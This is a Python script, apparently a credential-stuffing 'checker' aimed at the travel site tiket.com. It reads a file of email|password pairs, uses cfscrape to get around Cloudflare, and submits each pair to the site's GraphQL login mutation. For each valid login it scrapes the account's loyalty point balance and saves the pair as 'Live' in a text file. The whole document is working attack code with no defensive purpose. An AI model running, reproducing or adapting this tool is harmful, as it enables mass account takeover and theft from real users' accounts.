import requests
import re
import json
import cfscrape

def check(email,pwd):
    req = cfscrape.create_scraper()
    headers = {
        'accept': '*/*',
        'channelId': 'DESKTOP',
        'Referer': 'https://www.tiket.com/login?ref=https%3A%2F%2Fwww.tiket.com%2Fmyorder',
        'Origin': 'https://www.tiket.com',
        'lang': 'id',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36',
        'content-type': 'application/json',
    }

    data = '[{"operationName":"postLogin","variables":{"loginType":"PASSWORD","password":"'+pwd+'","sessionV3":true,"username":"'+email+'","memberType":"B2C"},"query":"mutation postLogin($loginType: String, $password: String, $sessionV3: Boolean, $username: String, $memberType: String, $trxId: String, $otp: String) {\\n  login(loginType: $loginType, password: $password, sessionV3: $sessionV3, username: $username, memberType: $memberType, otp: $otp, trxId: $trxId) {\\n    code\\n    message\\n    data {\\n      accountFirstName\\n      accountId\\n      accountLastName\\n      username\\n      __typename\\n    }\\n    errors\\n    __typename\\n  }\\n}\\n"}]'
    req.get('https://www.tiket.com/', verify=False)
    response = req.post('https://gql.tiket.com/', headers=headers, data=data)
    jason = json.loads(response.text)
    validate = jason[0]['data']['login']['code']
    if validate == 'SUCCESS':
        info = req.get('https://www.tiket.com/myorder', verify=False)
        regeks = re.search(r'window\.__data = (.*)', info.text).group(1)
        regeks = regeks[0:len(regeks)-1]
        jason2 = json.loads(regeks)
        point = jason2['app']['account']['data']['results']['point_balance']['point_amount']
        hasil = 'Live | '+email+' | '+pwd+' | Point: '+point
        with open('live-tiket.txt','a') as f:
            f.write(hasil+'\n')
    else:
        hasil = 'Die | '+email+' | '+pwd
    return hasil

namafile = input('Nama file untuk email|pass:')
baca = open(namafile, 'r')
lines = [line.rstrip('\n') for line in baca]
print("Total email|pass: "+str(len(lines)))
for line in lines:
    email, pwd = line.split('|')
    print(check(email,pwd))
baca.close()
